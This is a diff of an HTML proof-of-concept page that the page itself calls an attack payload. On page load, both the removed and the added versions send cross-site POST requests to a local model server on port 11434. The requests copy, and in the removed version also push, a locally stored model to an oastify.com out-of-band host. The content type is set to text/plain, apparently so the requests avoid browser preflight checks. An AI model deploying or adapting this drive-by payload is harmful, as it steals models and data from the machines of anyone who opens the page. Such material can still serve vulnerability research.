@@ -1,47 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
+
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto XHR Requests</title>
+  </head>
+  <body onload="execQuark()">
+    This contains the payload for mlflow  attack
+    </body>
+
     <script>
-        function sendRequests() {
-            // First POST request
-            var xhr1 = new XMLHttpRequest();
-            xhr1.open("POST", "http://localhost:11434/api/push", true);
-            xhr1.setRequestHeader("Content-Type", "text/plain");
+    function execQuark() {
 
-              xhr1.send(JSON.stringify({
-                model: "theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/deepseek-r1:14b",
-                stream: false
-            }));
-            xhr1.onreadystatechange = function () {
-                if (xhr1.readyState === 4 && xhr1.status === 200) {
-                    console.log("Push Request Successful:", xhr1.responseText);
-                }
-            };
-          
+      var copyData = "{\n\"source\":\"deepseek-r1:14b\",\n\"destination\":\"theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/deepseek-r1:14b\"\n}";
 
-            // Second POST request
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open("POST", "http://localhost:11434/api/copy", true);
-            xhr2.send(JSON.stringify({
-                source: "deepseek-r1:14b",
-                destination: "theunvhsdm06ayhgxcd19zphc8iz6zuo.oastify.com/test/deepseek-r1:14b"
-            }));
-            xhr2.onreadystatechange = function () {
-                if (xhr2.readyState === 4 && xhr2.status === 200) {
-                    console.log("Copy Request Successful:", xhr2.responseText);
-                }
-            };
-   
+      var updateXhr = new XMLHttpRequest();
+      updateXhr.withCredentials = true;
+      
+      updateXhr.addEventListener("readystatechange", function() {
+        if(this.readyState === 4) {
+          console.log(this.responseText);
         }
+      });
+      
+      updateXhr.open("POST", "http://localhost:11434/api/copy");
+      updateXhr.setRequestHeader("Content-Type", "text/plain");
+      
+      updateXhr.send(copyData);
 
-        // Run on page load
-        window.onload = sendRequests;
+    }
     </script>
-</head>
-<body>
-    <h1>XHR Requests Running on Page Load</h1>
-</body>
-</html>
+
+    </html>
